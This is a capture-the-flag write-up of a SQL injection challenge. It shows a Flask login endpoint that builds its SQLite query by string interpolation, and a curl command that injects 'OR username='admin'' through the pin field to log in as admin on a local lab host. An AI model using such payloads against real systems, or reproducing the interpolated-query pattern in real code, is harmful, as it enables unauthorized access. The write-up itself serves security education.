# SQL Injection 1

In this challenge, we are given a login service. Compared the the Authentication Bypass challenges, authentication is hardened
by using encrypted session cookies:

```python
@app.route("/authenticate", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        ...
```
`flask.session.get()` uses the flask library to encrypt the cookie. Therefore, we must go through the actual authentication
in the POST endpoint. Let's take a look at that.

```python
@app.route("/authenticate", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("identity")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `identity` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

```

Let's see what this is doing here. We see that the form requests the 2 parameters, `indentity` and `pin`. It then has checks to
ensure that both exist and that the `pin` is a numerical value. Notice how the `query` is built. In previous challenges, the query
to the database was crafted more securely. For example, in Authentication Bypass:

```python
user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
```

The lack of using this format to build queries is our attack vector. Let's look at what is in the database:

```python
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")
```

So the goal here is to retrieve the `admin` row, even though we don't know what the `pin` is.
So ideally, this is the kind of query we want:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 123 OR username = 'admin'
                                             ^^^^^            ^^^^^^^^^^^^^^^^^^^^^^^^^
                                             Data that we control
```

Let's see what is happening here. We can think of the WHERE clause as 2 parts:
1. (username = 'admin' AND pin = 123)
2. (username = 'admin')

Therefore, we return the row if condition 1 or condition 2 matches. We know that 1 won't match, because the pin is wrong.
But condition two will always match to the `admin` row inside the database! This will return the row to `user`, which will
pass the `if not user:` check, set the `user` cookie to `admin`, and then redirect to the GET endpoint.

Here is what the payload looks like:
```bash
curl 'challenge.localhost:80/authenticate' -d "identity=admin" -d "pin=123 OR username='admin'" -L -b cookie.txt
```

I also had to add the `-L` and `-b` flags to curl. The `-L` flag is to automatically follow redirects. `-b` tells curl to send the cookies.
We didn't have to do this before because we were the ones hitting the GET endpoint ourselves. Now, the POST endpoint we hit is redirecting us
to the GET endpoint.

The GET endpoint will now return us the flag!